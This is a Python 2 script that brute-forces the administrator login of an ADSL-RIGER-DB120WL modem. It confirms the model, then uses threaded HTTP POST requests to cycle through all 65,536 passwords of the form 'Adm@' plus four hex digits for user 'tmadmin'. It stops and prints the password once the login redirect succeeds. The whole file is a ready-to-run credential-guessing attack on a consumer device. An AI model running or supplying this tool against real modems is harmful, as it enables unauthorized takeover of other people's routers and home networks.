#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests
import threading
import Queue
import os
import sys
import timeit
from requests.exceptions import ConnectionError

queue = Queue.Queue()
threads = []
start = timeit.default_timer()

#manipulated variable
totalparts=8 #better can devide the 65536 equally

class BruteThread(threading.Thread):
    def __init__(self, queue, tid):
        threading.Thread.__init__(self)
        self.queue = queue
        self.tid = tid

    def run(self):

        while True:
            try:
                num=self.queue.get(timeout=1)
            except Queue.Empty():
                break

            dapw=numtoPW(num)
            TRY=True
            while TRY:
                try:
                    payload = {'LoginNameValue':'tmadmin','LoginPasswordValue':dapw}
                    r = requests.post('http://'+target+'/Forms/TM2Auth_1', data=payload, allow_redirects=False, timeout=60)
                    location = r.headers['Location']
                    TRY=False
                except ConnectionError, e:
                    print "\r\033[91m[-] Testing {} Connection Timeout...Retrying...\033[0m".format(dapw)
                    TRY=True

            if 'rpSys.html' in location:
                global start
                stop = timeit.default_timer()
                print "\r\033[92mSuccess! Password is: {}\033[0m".format(dapw)
                print "\r\033[92mUsed {} Seconds to complete.\033[0m".format(stop - start)
                os.kill(os.getpid(), 2)
            else:
                print "\r\033[91m[-] Attempt failed. TEST {}\t: {}, RESULT: {}\033[0m".format(num,dapw, 'Failed')
            self.queue.task_done()

def verify(target):
    try:
        r = requests.get('http://'+target+'/')
    except ConnectionError, e:
        print "\r\033[91m[-] Target Modem Down\033[0m"
        sys.exit(2)
    if "Modem model: ADSL-RIGER-DB120WL" not in r.text:
        print "\r\033[91m[-] Target Modem model not supported.\033[0m"
        sys.exit(2)

def numtoPW(x):
    backnum = len(hex(x).split('0x')[1])
    if backnum < 4:
        num = '0' * (4 - backnum) + hex(x).split('0x')[1]
        return ('Adm@' + num.upper())
    else:
        num = hex(x).split('0x')[1]
        return ('Adm@' + num.upper())


if __name__ == '__main__' :

    if len(sys.argv)== 2:
        target = str(sys.argv[1])
    else:
        print 'Usage: {} [TARGET_IP]'.format(sys.argv[0])
        sys.exit(2)

    verify(target)

    for i in range(1,10):
        worker = BruteThread(queue,i)
        worker.setDaemon(True)
        worker.start()
        threads.append(worker)

    part=0
    count_in_part=0
    for x in xrange(65536):
        num=(65536/totalparts*part)+count_in_part
        queue.put(num)

        if part>=totalparts-1:
            count_in_part+=1
            part=0
        else:
            part+=1

    queue.join()

    for item in threads:
        item.join()

    print 'Done!'
    os.kill(os.getpid(), 2)
